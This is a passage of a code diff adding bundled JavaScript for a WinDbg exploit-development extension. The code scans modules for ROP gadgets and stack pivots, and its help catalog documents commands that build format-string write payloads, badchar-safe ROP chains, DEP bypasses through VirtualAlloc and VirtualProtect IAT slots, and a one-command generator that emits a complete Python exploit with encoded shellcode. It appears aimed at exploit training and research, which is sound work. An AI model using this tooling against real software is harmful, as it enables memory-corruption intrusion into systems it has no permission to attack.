+      description: "Scan for retn N gadgets that pop N bytes before returning.",
+      usage: "dx @$osed().retn(module?, maxResults?, executableOnly?, mode?)",
+      examples: [
+        'dx @$osed().retn("essfunc")',
+        'dx @$osed().retn("essfunc", 100)'
+      ],
+      schema: {
+        module: { type: "string" },
+        executableOnly: { type: "boolean", default: true },
+        maxResults: { type: "number", min: 1, max: 200, default: 50 },
+        mode: { type: "string", enum: ["fast", "thorough"], default: "fast" }
+      },
+      execute(options) {
+        var _a, _b;
+        const pointerSize = getPointerSize();
+        const maxResults = Math.min((_a = options.maxResults) != null ? _a : 50, 200);
+        const executableOnly = (_b = options.executableOnly) != null ? _b : true;
+        const moduleFilter = options.module;
+        const chunkSize = options.mode === "thorough" ? 4096 : 16384;
+        const scan = scanPattern({ module: moduleFilter, executableOnly, maxResults: 200, chunkSize }, Uint8Array.from([194]));
+        const warnings = [...scan.warnings.map((w) => `${w.region}: ${w.message}`)];
+        const groups = /* @__PURE__ */ new Map();
+        for (const hit of scan.hits) {
+          const bytes = tryReadMemory(hit, 3);
+          if (!bytes || bytes.length < 3 || bytes[0] !== 194)
+            continue;
+          const n = bytes[1] | bytes[2] << 8;
+          if (n === 0)
+            continue;
+          const existing = groups.get(n);
+          if (existing) {
+            existing.count += 1;
+          } else {
+            groups.set(n, { first: hit, count: 1 });
+          }
+        }
+        const sorted = [...groups.entries()].sort(([a], [b]) => a - b).slice(0, maxResults);
+        const findings = sorted.map(([n, { first, count }]) => ({ n, address: first, count }));
+        const rows = findings.map(({ n, address, count }) => ({
+          n: `0x${n.toString(16).toUpperCase().padStart(4, "0")}`,
+          decimal: n.toString(),
+          count: count.toString(),
+          address: formatAddress(address, pointerSize),
+          python: `0x${address.toString(16).toUpperCase()}`
+        }));
+        section("RETN N Gadgets");
+        if (rows.length === 0) {
+          print("No retn N gadgets found.");
+        } else {
+          table([
+            { key: "n", header: "N (hex)", width: 8 },
+            { key: "decimal", header: "N (dec)", width: 8 },
+            { key: "count", header: "Count", width: 6 },
+            { key: "address", header: "Address", width: 18 },
+            { key: "python", header: "Python", width: 14 }
+          ], rows);
+        }
+        whyItMatters("retn N pops N bytes before returning \u2014 used to skip arguments in stdcall ROP chains.");
+        return {
+          command: "retn",
+          args: options,
+          success: true,
+          findings,
+          warnings,
+          errors: [],
+          stats: scan.stats
+        };
+      }
+    };
+    const addEsp = {
+      name: "add_esp",
+      description: "Scan for add esp, N ; ret gadgets used to skip stack slots in ROP chains.",
+      usage: "dx @$osed().add_esp(module?, maxResults?, executableOnly?, mode?)",
+      examples: [
+        'dx @$osed().add_esp("essfunc")',
+        'dx @$osed().add_esp("essfunc", 100)'
+      ],
+      schema: {
+        module: { type: "string" },
+        executableOnly: { type: "boolean", default: true },
+        maxResults: { type: "number", min: 1, max: 200, default: 50 },
+        mode: { type: "string", enum: ["fast", "thorough"], default: "fast" }
+      },
+      execute(options) {
+        var _a, _b, _c, _d, _e, _f, _g, _h, _i, _j, _k, _l, _m, _n, _o, _p, _q, _r;
+        const pointerSize = getPointerSize();
+        const maxResults = Math.min((_a = options.maxResults) != null ? _a : 50, 200);
+        const executableOnly = (_b = options.executableOnly) != null ? _b : true;
+        const moduleFilter = options.module;
+        const chunkSize = options.mode === "thorough" ? 4096 : 16384;
+        const warnings = [];
+        const groups = /* @__PURE__ */ new Map();
+        const scan8 = scanPattern({ module: moduleFilter, executableOnly, maxResults: 200, chunkSize }, Uint8Array.from([131, 196]));
+        warnings.push(...scan8.warnings.map((w) => `${w.region}: ${w.message}`));
+        for (const hit of scan8.hits) {
+          const bytes = tryReadMemory(hit, 4);
+          if (!bytes || bytes.length < 4 || bytes[0] !== 131 || bytes[1] !== 196 || bytes[3] !== 195)
+            continue;
+          const n = bytes[2];
+          if (n === 0)
+            continue;
+          const existing = groups.get(n);
+          if (existing) {
+            existing.count += 1;
+          } else {
+            groups.set(n, { first: hit, count: 1, imm32: false });
+          }
+        }
+        const scan32 = scanPattern({ module: moduleFilter, executableOnly, maxResults: 200, chunkSize }, Uint8Array.from([129, 196]));
+        warnings.push(...scan32.warnings.map((w) => `${w.region}: ${w.message}`));
+        for (const hit of scan32.hits) {
+          const bytes = tryReadMemory(hit, 7);
+          if (!bytes || bytes.length < 7 || bytes[0] !== 129 || bytes[1] !== 196 || bytes[6] !== 195)
+            continue;
+          const n = bytes[2] | bytes[3] << 8 | bytes[4] << 16 | bytes[5] << 24;
+          if (n <= 0)
+            continue;
+          if (!groups.has(n)) {
+            groups.set(n, { first: hit, count: 1, imm32: true });
+          } else {
+            groups.get(n).count += 1;
+          }
+        }
+        const sorted = [...groups.entries()].filter(([n]) => n > 0).sort(([a], [b]) => a - b).slice(0, maxResults);
+        const findings = sorted.map(([n, { first, count, imm32 }]) => ({ n, address: first, count, imm32 }));
+        const rows = findings.map(({ n, address, count, imm32 }) => ({
+          n: `0x${n.toString(16).toUpperCase().padStart(imm32 ? 8 : 2, "0")}`,
+          decimal: n.toString(),
+          enc: imm32 ? "imm32" : "imm8",
+          count: count.toString(),
+          address: formatAddress(address, pointerSize),
+          python: `0x${address.toString(16).toUpperCase()}`
+        }));
+        section("ADD ESP, N ; RET Gadgets");
+        if (rows.length === 0) {
+          print("No add esp, N ; ret gadgets found.");
+        } else {
+          table([
+            { key: "n", header: "N (hex)", width: 10 },
+            { key: "decimal", header: "N (dec)", width: 8 },
+            { key: "enc", header: "Enc", width: 6 },
+            { key: "count", header: "Count", width: 6 },
+            { key: "address", header: "Address", width: 18 },
+            { key: "python", header: "Python", width: 14 }
+          ], rows);
+        }
+        whyItMatters("add esp, N skips N bytes of ROP chain slots \u2014 essential for aligning stdcall argument frames.");
+        const stats = {
+          sectionsScanned: ((_d = (_c = scan8.stats) == null ? void 0 : _c.sectionsScanned) != null ? _d : 0) + ((_f = (_e = scan32.stats) == null ? void 0 : _e.sectionsScanned) != null ? _f : 0),
+          chunksRead: ((_h = (_g = scan8.stats) == null ? void 0 : _g.chunksRead) != null ? _h : 0) + ((_j = (_i = scan32.stats) == null ? void 0 : _i.chunksRead) != null ? _j : 0),
+          chunksSkipped: ((_l = (_k = scan8.stats) == null ? void 0 : _k.chunksSkipped) != null ? _l : 0) + ((_n = (_m = scan32.stats) == null ? void 0 : _m.chunksSkipped) != null ? _n : 0),
+          results: findings.length,
+          stoppedEarly: ((_p = (_o = scan8.stats) == null ? void 0 : _o.stoppedEarly) != null ? _p : 0) + ((_r = (_q = scan32.stats) == null ? void 0 : _q.stoppedEarly) != null ? _r : 0)
+        };
+        return { command: "add_esp", args: options, success: true, findings, warnings, errors: [], stats };
+      }
+    };
+    return [rop, findBytes, ropSuggest, retnGadgets, addEsp];
+  }
+
+  // src/commands/pivot.ts
+  var PIVOT_PATTERNS = [
+    { sequence: "xchg eax, esp ; ret", bytes: [148, 195] },
+    { sequence: "xchg ecx, esp ; ret", bytes: [135, 204, 195] },
+    { sequence: "xchg edx, esp ; ret", bytes: [135, 212, 195] },
+    { sequence: "xchg ebx, esp ; ret", bytes: [135, 220, 195] },
+    { sequence: "xchg esi, esp ; ret", bytes: [135, 244, 195] },
+    { sequence: "xchg edi, esp ; ret", bytes: [135, 252, 195] },
+    { sequence: "xchg ebp, esp ; ret", bytes: [135, 236, 195] },
+    { sequence: "push esp ; ret", bytes: [84, 195] },
+    { sequence: "mov esp, ebp ; ret", bytes: [139, 229, 195] },
+    { sequence: "mov esp, eax ; ret", bytes: [137, 196, 195] },
+    { sequence: "leave ; ret", bytes: [201, 195] }
+  ];
+  var X64_PIVOT_PATTERNS = [
+    { sequence: "xchg rax, rsp ; ret", bytes: [72, 148, 195] },
+    { sequence: "xchg rcx, rsp ; ret", bytes: [72, 135, 204, 195] },
+    { sequence: "xchg rdx, rsp ; ret", bytes: [72, 135, 212, 195] },
+    { sequence: "xchg rbx, rsp ; ret", bytes: [72, 135, 220, 195] },
+    { sequence: "xchg rsi, rsp ; ret", bytes: [72, 135, 244, 195] },
+    { sequence: "xchg rdi, rsp ; ret", bytes: [72, 135, 252, 195] },
+    { sequence: "xchg rbp, rsp ; ret", bytes: [72, 135, 236, 195] },
+    { sequence: "push rsp ; ret", bytes: [84, 195] },
+    { sequence: "mov rsp, rbp ; ret", bytes: [72, 137, 236, 195] },
+    { sequence: "mov rsp, rax ; ret", bytes: [72, 137, 196, 195] },
+    { sequence: "leave ; ret", bytes: [201, 195] }
+  ];
+  function buildSequence(address, sequence) {
+    const moduleInfo = findModuleByAddress(address);
+    const provenance2 = {
+      module: moduleInfo == null ? void 0 : moduleInfo.name,
+      section: moduleInfo ? ".text" : void 0,
+      virtualAddress: Number(__bi.and(address, __bi(4294967295))),
+      fileOffset: void 0,
+      executable: "EXACT",
+      writable: "UNKNOWN",
+      aslr: "UNKNOWN",
+      rebaseable: "UNKNOWN"
+    };
+    const source = {
+      kind: "pivot-scan",
+      name: "stack-pivot",
+      format: "synthetic",
+      version: "v1"
+    };
+    return {
+      schemaVersion: SEMANTIC_SCHEMA_VERSION,
+      id: `pivot:${sequence}:${address.toString(16)}`,
+      source,
+      originalText: sequence,
+      instructions: sequence.split(" ; ").map((part) => parseInstruction(part)),
+      provenance: provenance2
+    };
+  }
+  function createPivotCommand() {
+    return {
+      name: "pivots",
+      description: "Scan for stack pivot candidates.",
+      usage: "dx @$osed().pivots(module?, maxResults?, executableOnly?, mode?)",
+      examples: ['dx @$osed().pivots("essfunc")', 'dx @$osed().pivots("", 50, true, "thorough")'],
+      schema: {
+        module: { type: "string" },
+        executableOnly: { type: "boolean", default: true },
+        maxResults: { type: "number", min: 1, max: 200, default: 50 },
+        mode: { type: "string", enum: ["fast", "thorough"], default: "fast" }
+      },
+      execute(options) {
+        var _a, _b, _c, _d;
+        const pointerSize = getPointerSize();
+        const patterns = pointerSize === 8 ? X64_PIVOT_PATTERNS : PIVOT_PATTERNS;
+        const warnings = [];
+        const sequenceHits = [];
+        const detailsByAddress = /* @__PURE__ */ new Map();
+        for (const pivot of patterns) {
+          const scan = scanPattern({
+            module: options.module,
+            executableOnly: (_a = options.executableOnly) != null ? _a : true,
+            maxResults: (_b = options.maxResults) != null ? _b : 50,
+            chunkSize: options.mode === "thorough" ? 4096 : 16384
+          }, Uint8Array.from(pivot.bytes));
+          warnings.push(...scan.warnings.map((warning) => `${warning.region}: ${warning.message}`));
+          for (const hit of scan.hits) {
+            const candidate = readMemory(hit, pivot.bytes.length);
+            const validated = validateInstructionCandidateForPointerSize(candidate, true, true, pointerSize);
+            if (!validated.flags.decoded || !validated.flags.mnemonicMatch || !validated.flags.executable) {
+              continue;
+            }
+            detailsByAddress.set(hit, {
+              sequence: pivot.sequence,
+              flags: validated.flags
+            });
+            sequenceHits.push(buildSequence(hit, pivot.sequence));
+          }
+        }
+        const findings = pointerSize === 8 ? [...detailsByAddress.entries()].map(([address, detail]) => ({
+          address,
+          sequence: detail.sequence,
+          offset: `0x${address.toString(16).toUpperCase()}`,
+          flags: detail.flags
+        })).sort((left, right) => left.address < right.address ? -1 : 1).slice(0, Math.min((_c = options.maxResults) != null ? _c : 50, 200)) : buildCapabilityIndex(buildRopIndexFromSequences(sequenceHits)).query({
+          capability: "STACK_PIVOT",
+          executableOnly: true
+        }).map((gadget) => {
+          var _a2, _b2, _c2, _d2;
+          const address = __bi((_b2 = (_a2 = gadget.locations[0]) == null ? void 0 : _a2.virtualAddress) != null ? _b2 : 0);
+          const detail = detailsByAddress.get(address);
+          return {
+            address,
+            sequence: (_c2 = detail == null ? void 0 : detail.sequence) != null ? _c2 : gadget.instructions.map((instruction) => instruction.normalizedText || instruction.originalText).join(" ; "),
+            offset: `0x${address.toString(16).toUpperCase()}`,
+            flags: (_d2 = detail == null ? void 0 : detail.flags) != null ? _d2 : {}
+          };
+        }).sort((left, right) => left.address < right.address ? -1 : 1).slice(0, Math.min((_d = options.maxResults) != null ? _d : 50, 200));
+        section("Stack Pivot Candidates");
+        table([
+          { key: "address", header: "Address", width: 18 },
+          { key: "sequence", header: "Sequence", width: 22 },
+          { key: "python", header: "Python", width: 18 }
+        ], findings.map((finding) => ({
+          address: formatAddress(finding.address, pointerSize),
+          sequence: finding.sequence,
+          python: `0x${finding.address.toString(16).toUpperCase()}`
+        })));
+        whyItMatters("Stack pivots transition execution into attacker-controlled ROP chains.");
+        return {
+          command: "pivots",
+          args: options,
+          success: true,
+          findings,
+          warnings,
+          errors: []
+        };
+      }
+    };
+  }
+
+  // src/core/help_catalog.ts
+  function normalizeHelpExamples(examples) {
+    return examples.map((example) => typeof example === "string" ? { command: example } : example);
+  }
+  var NAMESPACE_HELP_ENTRIES = [
+    {
+      name: "leak.classify",
+      summary: "Classify a pointer value without dereferencing it.",
+      description: "Classifies a supplied pointer value against loaded modules and memory regions. It does not inspect a pointer stored at an address and does not establish an information disclosure.",
+      usage: "dx @$osed().leak.classify(value)",
+      examples: ["dx @$osed().leak.classify(0x76A31240)"],
+      limitations: ["Classification is debugger-observed evidence, not proof that an application exposes the value."]
+    },
+    {
+      name: "leak.scan",
+      description: "Scans an explicitly bounded range for pointer-sized values and classifies their current targets.",
+      usage: "dx @$osed().leak.scan(address, length?)",
+      examples: ["dx @$osed().leak.scan(0x0014DD28, 0x400)"],
+      limitations: ["Reads debugger memory only; it does not establish that any pointer is externally disclosed."]
+    },
+    {
+      name: "leak.analyze",
+      description: "Extracts hexadecimal pointer candidates from supplied output text and correlates them with the current target.",
+      usage: "dx @$osed().leak.analyze(text)",
+      examples: ['dx @$osed().leak.analyze("Error processing request at 76A31240")'],
+      limitations: ["Supplied text is leak-derived evidence, not independent proof of attacker observability."]
+    },
+    {
+      name: "leak.base",
+      description: "Calculates a candidate module base from a pointer and RVA, then validates it against the current target mapping.",
+      usage: "dx @$osed().leak.base(pointer, rva)",
+      examples: ["dx @$osed().leak.base(0x76A31240, 0x1240)"],
+      limitations: ["A base is validated only when it matches a currently loaded module; this does not establish exploit usability."]
+    },
+    {
+      name: "pattern.create",
+      description: "Generates cyclic pattern text.",
+      usage: "dx @$osed().pattern.create(length, type?)",
+      examples: ['dx @$osed().pattern.create(300, "msf")']
+    },
+    {
+      name: "pattern.offset",
+      description: "Finds an offset in the selected pattern family.",
+      usage: "dx @$osed().pattern.offset(value, type?)",
+      examples: ['dx @$osed().pattern.offset(0x39654138, "msf")']
+    },
+    {
+      name: "seh.visualize",
+      description: "Walks the current thread SEH chain.",
+      usage: "dx @$osed().seh.visualize()",
+      examples: ["dx @$osed().seh.visualize()"]
+    },
+    {
+      name: "fmt.build",
+      description: "Builds a format-string write payload.",
+      usage: "dx @$osed().fmt.build(addr, value, argIndex, width?, exclude?)",
+      examples: ["dx @$osed().fmt.build(0x00402118, 0x625011AF, 6)"]
+    },
+    {
+      name: "fmt.offset",
+      description: "Finds the controlled format-string parameter index.",
+      usage: "dx @$osed().fmt.offset(marker?, count?, firstArg?)",
+      examples: ["dx @$osed().fmt.offset(0x41414141, 40)"]
+    },
+    {
+      name: "fmt.inspect",
+      description: "Inspects a paused x86 cdecl printf-family call, its format-string argument, and its format specifiers.",
+      usage: "dx @$osed().fmt.inspect(family?, formatArgOffset?, max?)",
+      examples: ['dx @$osed().fmt.inspect("printf")', 'dx @$osed().fmt.inspect("snprintf")'],
+      limitations: ["Manual, read-only inspection only. x64 ABI argument decoding is not implemented.", "A dangerous specifier does not establish reachability or attacker control."]
+    },
+    {
+      name: "str.read",
+      description: "Reads a null-terminated ASCII or UTF-16LE string from memory.",
+      usage: "dx @$osed().str.read(address, max?, encoding?)",
+      examples: ["dx @$osed().str.read(0x0019F920)", 'dx @$osed().str.read(0x0019F920, 128, "utf16le")']
+    },
+    {
+      name: "str.find",
+      description: "Finds ASCII and/or UTF-16LE string bytes in loaded module sections.",
+      usage: "dx @$osed().str.find(text, module?, encoding?, maxResults?)",
+      examples: ['dx @$osed().str.find("VirtualProtect")', 'dx @$osed().str.find("cmd.exe", "target", "ascii", 25)']
+    },
+    {
+      name: "str.refs",
+      description: "Finds executable absolute-pointer references to a string address or literal.",
+      usage: "dx @$osed().str.refs(target, module?, encoding?, maxResults?)",
+      examples: ['dx @$osed().str.refs("VirtualProtect")', 'dx @$osed().str.refs(0x00403080, "target", "ascii", 25)']
+    },
+    {
+      name: "str.bytes",
+      description: "Encodes text as payload bytes and reports bad-character hits.",
+      usage: "dx @$osed().str.bytes(text, encoding?, terminator?, exclude?)",
+      examples: ['dx @$osed().str.bytes("cmd.exe")', 'dx @$osed().str.bytes("W00T", "ascii", true, "00 0A 0D")']
+    },
+    {
+      name: "rop_find",
+      description: "Flat alias for legacy ROP helper/module triage.",
+      usage: "dx @$osed().rop_find(module?, maxResults?, executableOnly?, mode?)",
+      examples: ['dx @$osed().rop_find("essfunc")']
+    },
+    {
+      name: "rop.find",
+      description: "Runs the legacy ROP helper/module triage from the ROP namespace.",
+      usage: "dx @$osed().rop.find(module?, maxResults?, executableOnly?, mode?)",
+      examples: ['dx @$osed().rop.find("essfunc")']
+    },
+    {
+      name: "rop.scan",
+      description: "Loads pasted RP++ output into the semantic ROP corpus. Optionally filters gadgets whose addresses contain bad characters.",
+      usage: "dx @$osed().rop.scan(text, badchars?)",
+      examples: [
+        'dx @$osed().rop.scan("0x1000: pop eax ; ret ;")',
+        'dx @$osed().rop.scan(rpOutput, "00 0A 0D")'
+      ],
+      seeAlso: ["rop.scan_live", "rop.capabilities", "rop.corpus.report", "rop.corpus.export"]
+    },
+    {
+      name: "rop.scan_live",
+      description: "Discovers live gadgets across one or more modules and replaces or appends to the semantic corpus.",
+      usage: "dx @$osed().rop.scan_live(moduleOrModules?, badchars?, append?, maxPerPattern?, maxInstructionsPerGadget?, maxBackwardGadgets?)",
+      examples: [
+        'dx @$osed().rop.scan_live("compression", "00 0A 0D")',
+        'dx @$osed().rop.scan_live("crypto", "00 0A 0D", true)',
+        'dx @$osed().rop.scan_live("crypto", "00 0A 0D", true, 5)',
+        'dx @$osed().rop.scan_live("libspp.dll", "00 0A 0D", true, 40, 6)',
+        'dx @$osed().rop.scan_live("libspp.dll", "00 0A 0D", false, 40, 6, 50000)'
+      ],
+      seeAlso: ["rop.capabilities", "rop.corpus.export", "rop.generate"]
+    },
+    {
+      name: "rop.corpus.lookup",
+      description: "Read-only exact-address lookup in the active ROP corpus. Reports NOT_FOUND without scanning memory.",
+      usage: "dx @$osed().rop.corpus.lookup(address)",
+      examples: ["dx @$osed().rop.corpus.lookup(0x10154112)"],
+      seeAlso: ["rop.scan_live", "rop.query", "rop.corpus.report"]
+    },
+    {
+      name: "rop.api_plan",
+      description: "Read-only Phase 1 API-resolution analysis. Finds direct IAT slots and same-image exact-export anchors, validates live pointer/module/export evidence, and reports byte constraints. It never constructs or ranks ROP chains.",
+      usage: 'dx @$osed().rop.api_plan("MODULE!Symbol", badchars?)',
+      examples: [
+        'dx @$osed().rop.api_plan("KERNEL32!WriteProcessMemory", "00 0A 0D")',
+        'dx @$osed().rop.api_plan("VirtualProtect")'
+      ],
+      seeAlso: ["sc.iat", "rop.slot_call", "rop.construct", "rop.prove"]
+    },
+    {
+      name: "rop.api_build",
+      description: "Bounded Phase 2 composer for API-address resolution into EAX. Revalidates Phase 1 evidence in the current stopped-debugger snapshot, then supports exact pop, mov-reg-[reg], add, and ret/ret-N gadgets. It requires an explicit continuation and never invokes the API.",
+      usage: "dx @$osed().rop.api_build(target, badchars?, continuation?, preserve?, maxGadgets?, owner?, anchor?)",
+      examples: ['dx @$osed().rop.api_build("KERNEL32!WriteProcessMemory", "00 0A 0D", 0x10064A0F, "", 12, "libspp.dll", "QueryDosDeviceA")'],
+      seeAlso: ["rop.api_plan", "rop.construct", "rop.verify", "rop.prove"]
+    },
+    {
+      name: "rop.query",
+      description: "Filters the loaded semantic ROP corpus.",
+      usage: "dx @$osed().rop.query(field, value, executableOnly?, verbose?)",
+      examples: ['dx @$osed().rop.query("capability", "LOAD_REGISTER")', 'dx @$osed().rop.query("capability", "MEMORY_WRITE", false, true)'],
+      details: "The default table is compact: Address, Sequence, Capability, Stack, Score. Pass verbose:true in object form (or true as the fourth positional argument) to include module, reads/writes, memory effects, terminator, and all capabilities."
+    },
+    {
+      name: "rop.capabilities",
+      description: "Summarizes capabilities in the loaded semantic ROP corpus.",
+      usage: "dx @$osed().rop.capabilities()",
+      examples: ["dx @$osed().rop.capabilities()"]
+    },
+    {
+      name: "rop.plan",
+      description: "Plans feasible exploit strategies from semantic capabilities without selecting gadget addresses. Strategies: VirtualProtect, VirtualAlloc, WriteProcessMemory, VirtualProtectEx, VirtualAllocEx, WinExec, Stack Pivot.",
+      usage: "dx @$osed().rop.plan(strategy, apiResolution?)",
+      examples: ['dx @$osed().rop.plan("VirtualAlloc")', 'dx @$osed().rop.plan("VirtualProtect", "iat")', 'dx @$osed().rop.plan("WinExec")']
+    },
+    {
+      name: "rop.emit",
+      description: "Selects and ranks concrete gadgets for a plan strategy. Produces a gadget assignment, not an executable chain.",
+      usage: "dx @$osed().rop.emit(planId, strategyId?)",
+      examples: ["dx @$osed().rop.emit(1)", "dx @$osed().rop.emit(1, 3)"]
+    },
+    {
+      name: "rop.synthesize",
+      description: "Synthesizes a concrete stack layout from a plan and the current exploit state. Uses cached state from triage(); accepts optional overrides.",
+      usage: "dx @$osed().rop.synthesize(planId)",
+      examples: [
+        "dx @$osed().rop.synthesize(1)"
+      ]
+    },
+    {
+      name: "rop.construct",
+      description: "Builds a badchar-safe ROP recipe that loads a value into a register using pop/arithmetic gadgets. Models each gadget's full side effects: emits filler slots for extra pops and `add esp` skips so the chain stays aligned, reports every register the recipe clobbers (including non-pop writes like `mov eax, ...`), and excludes gadgets whose ESP shift cannot be padded (push, sub esp). Pass a preserve list to exclude gadgets that would overwrite registers you need to keep live (e.g. eax already staged for a stdcall frame).",
+      usage: "dx @$osed().rop.construct(register, value, badchars?, preserve?)",
+      examples: [
+        'dx @$osed().rop.construct("ebx", 0x201, "00 0A 0D")',
+        'dx @$osed().rop.construct("ebx", 0x201, "00 0A 0D", "eax")',
+        'dx @$osed().rop.construct("edx", 0x1000, "00 0A 0D", "eax ecx")'
+      ]
+    },
+    {
+      name: "rop.setup",
+      description: "Packs a whole set of target registers into a clobber-safe load sequence \u2014 the tool for staging a PUSHAD or stdcall frame. Exploits multi-pop gadgets to set several registers per gadget and orders gadgets so none overwrites an already-finalized register; reports honest conflicts when no ordering works. Values must be badchar-free (build tainted values with rop.construct first). Unlike rop.construct, it reasons about all target registers at once.",
+      usage: 'dx @$osed().rop.setup("reg=value reg=value ...", badchars?)',
+      examples: [
+        'dx @$osed().rop.setup("edi=0x10001000 ebx=0x40", "00 0A 0D")',
+        'dx @$osed().rop.setup("edi=0x10030000 esi=0x10040000 ebp=0x10050000 ebx=0x201 edx=0x40", "00 0A 0D")'
+      ]
+    },
+    {
+      name: "rop.frame_write",
+      description: "Builds a stdcall call frame WITHOUT pushad: assembles it word-by-word in a writable buffer via a canonical `mov [eax], ecx ; ret` store (eax=pointer, ecx=value), then `xchg eax, esp` pivots ESP onto the frame so the trailing ret dispatches into the API. Null/badchar-heavy words are synthesised in ecx (preserving the eax pointer) instead of placed in the payload. Words are ordered: word0 = API address (ret enters it), word1 = post-call target (must be executable), then the stdcall args. BUF must be a writable, stable, badchar-free address.",
+      usage: 'dx @$osed().rop.frame_write(buf, "word0 word1 arg1 arg2 ...", badchars?)',
+      examples: [
+        'dx @$osed().rop.frame_write("BUF", "VIRTUALALLOC POST_CALL 0x0 0x1000 0x3000 0x40", "00 0A 0D")',
+        'dx @$osed().rop.frame_write("0x00420000", "[0x1005D060] 0x10017260 0x0 0x1000 0x3000 0x40", "00 0A 0D")'
+      ]
+      // A word written as [0xSLOT] dereferences that IAT slot at runtime (mov reg, [slot]) —
+      // use it for an ASLR'd imported API (pass its non-ASLR IAT slot, not the resolved address).
+    },
+    {
+      name: "rop.slot_call",
+      description: "ASLR-proof stdcall call through a non-ASLR IAT slot, using a deref preamble dispatched by `jmp <reg>`. The deref/dispatch register is chosen from the loaded corpus (any register, or a two-register `mov <val>,[<ptr>]` split), ranked stable-first \u2014 not assumed to be eax. Emits, as data in a write-built frame: `pop <ptr>` (=slot), `mov <val>,[<ptr>]` (val = live API address), `jmp <val>` (dispatch), then the fake stdcall frame \u2014 arg0 = the API's return target (must be executable, e.g. shellcode / jmp esp), then the stdcall args. The API's real (ASLR'd) address is NEVER placed in the payload; it is read from the fixed IAT slot at runtime. Null/badchar args are synthesised in a register and stored (via the frame_write engine). BUF must be a writable, stable, badchar-free address. Reports honestly when the corpus has no composable deref/dispatch; warns if any preamble gadget is at a non-stable (relocating) address.",
+      usage: 'dx @$osed().rop.slot_call(buf, iatSlot, "retaddr arg1 arg2 ...", badchars?, entrySkew?)',
+      examples: [
+        // VirtualAlloc(lpAddress, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE) via its IAT slot;
+        // retaddr = arg1 = the shellcode address (re-commit the page RWX in place, then return into it).
+        'dx @$osed().rop.slot_call("0x00420000", "0x1005D060", "SHELLCODE SHELLCODE 0x1000 0x1000 0x40", "00 0A 0D")',
+        // entrySkew: if the vulnerable function returns with `ret N` (ESP is N bytes high on entry),
+        // pass N so the right filler is inserted after the entry gadget. e.g. `ret 4` -> 4:
+        'dx @$osed().rop.slot_call("0x00420000", "0x1005D060", "SHELLCODE SHELLCODE 0x1000 0x1000 0x40", "00 0A 0D", 4)'
+      ]
+    },
+    {
+      name: "rop.generate",
+      description: 'One-command exploit generator. Discovers the IAT slot and writable buffer, builds a slot_call ROP chain for the chosen DEP-bypass API, XOR-encodes shellcode, and emits a complete Python exploit. Use api: "auto" to enumerate all candidates and select the best. All discovery is optional \u2014 pass iatSlot, buf, retAddr manually to override. Requires a loaded corpus (rop.scan / rop.scan_live).',
+      usage: "dx @$osed().rop.generate(api, shellcode?, badchars?, module?, offset?)",
+      examples: [
+        'dx @$osed().rop.generate("auto", "", "00 0A 0D", "MSA2Mfilter03", 780)',
+        'dx @$osed().rop.generate("VirtualAlloc", "FC E8 82 00 00 00 60", "00 0A 0D")',
+        'dx @$osed().rop.generate("VirtualProtect")'
+      ],
+      seeAlso: ["rop.scan_live", "rop.verify", "rop.prove"]
+    },
+    {
+      name: "rop.verify",
+      description: "Chain verifier. Inspects a generated or manually supplied ROP chain for bad characters, unresolved placeholders, stack consumption, and register side effects. Reports static validity separately from a DWORD-by-DWORD runtime trace with ESP movement and register state. Never modifies the chain \u2014 read-only analysis.",
+      usage: "dx @$osed().rop.verify(chain?, badchars?, api?)",
+      examples: [
+        "dx @$osed().rop.verify()                                          // verify last rop.generate result",
+        'dx @$osed().rop.verify("", "00 0A 0D")                            // verify last result with explicit badchars',
+        'dx @$osed().rop.verify("10022D64 1005D060 DEADBEEF", "00 0A 0D")'
+      ],
+      seeAlso: ["rop.generate", "rop.prove"]
+    },
+    {
+      name: "rop.prove",
+      description: "Guided debugger-backed ROP proof. Predicts one checkpoint at a time, optionally owns one one-shot breakpoint, and never resumes execution. Reports gadget execution separately from the DEP objective.",
+      usage: "dx @$osed().rop.prove(modeOrAction?)",
+      examples: [
+        'dx @$osed().rop.prove("guided")',
+        'dx @$osed().rop.prove("observe")',
+        "dx @$osed().rop.prove()",
+        'dx @$osed().rop.prove("status")',
+        'dx @$osed().rop.prove("cancel")',
+        'dx @$osed().rop.prove("export")'
+      ],
+      seeAlso: ["rop.generate", "rop.verify"]
+    },
+    {
+      name: "rop.export",
+      description: "Exports emitted gadgets (and optionally the synthesized stack layout) as a Python exploit stub. If a file path is given, writes to disk; otherwise prints to console.",
+      usage: "dx @$osed().rop.export(planId, path?)",
+      examples: [
+        "dx @$osed().rop.export(1)",
+        'dx @$osed().rop.export(1, "C:\\\\exploit\\\\rop.py")'
+      ],
+      details: "Turns an emitted plan (from rop.emit) into a ready-to-paste Python exploit stub. Needs a plan id \u2014 run rop.plan then rop.emit first. This exports a single chain as Python; to save the whole gadget corpus for reuse, use rop.corpus.export instead.",
+      seeAlso: ["rop.plan", "rop.emit", "rop.corpus.export"]
+    },
+    {
+      name: "rop.corpus.export",
+      description: "Exports a compact, regenerable ROP corpus and live validation fingerprint as JSON.",
+      usage: "dx @$osed().rop.corpus.export(path?)",
+      examples: [
+        'dx @$osed().rop.corpus.export("C:\\\\notes\\\\rop-corpus.json")  // Saves the current corpus to disk.',
+        "dx @$osed().rop.corpus.export()                              // print JSON to the console"
+      ],
+      details: "Saves the gadgets you scanned this session so you don't have to re-scan next time. Scanning a large target is slow; export once, then rop.corpus.import it in a later session. The JSON also records a fingerprint (module bases + sampled gadget bytes) so a reloaded corpus can be checked against live memory before you trust its addresses. Run this after rop.scan / rop.scan_live has populated the corpus.",
+      seeAlso: ["rop.scan_live", "rop.corpus.report", "rop.corpus.import", "rop.corpus.validate"]
+    },
+    {
+      name: "rop.corpus.report",
+      summary: "Write or print a human-readable gadget inventory.",
+      description: "Formats the current ROP corpus as a deterministic one-line-per-gadget report. It is for visual gadget review; rop.corpus.export remains the lossless JSON archive.",
+      usage: "dx @$osed().rop.corpus.report(path?)",
+      examples: [
+        "dx @$osed().rop.corpus.report()",
+        'dx @$osed().rop.corpus.report("C:\\\\notes\\\\rop-gadgets.txt")'
+      ],
+      prerequisites: ["Run rop.scan(...) or rop.scan_live(...) first. Imported corpora are marked unverified until validation."],
+      limitations: ["The report performs no additional gadget scanning. Unknown module metadata and semantic facts are rendered as ?."],
+      seeAlso: ["rop.scan_live", "rop.capabilities", "rop.corpus.export"]
+    },
+    {
+      name: "rop.corpus.import",
+      description: "Imports a corpus as stale evidence. Run rop.corpus.validate() before querying or planning.",
+      usage: "dx @$osed().rop.corpus.import(path)",
+      examples: ['dx @$osed().rop.corpus.import("C:\\\\notes\\\\rop-corpus.json")'],
